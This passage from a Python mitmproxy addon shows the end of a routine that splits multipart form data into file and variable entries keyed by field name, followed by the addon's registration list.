                            'type'    : 'file',
                            'filename': filename,
                            'value'   : value
                        })

                    else:
                        match = rx.search(parts[1])
                        if match:
                            key = match.group(1)
                            value = b"\n".join(parts[3 + parts[2:].index(b""):])
                            if(not key in r):
                                r[key] = []
                            r[key].append({
                                'type'    : 'var',
                                'filename': None,
                                'value'   : value
                            })
            return r
        return {}
addons = [
    MitmProxyAddon()
]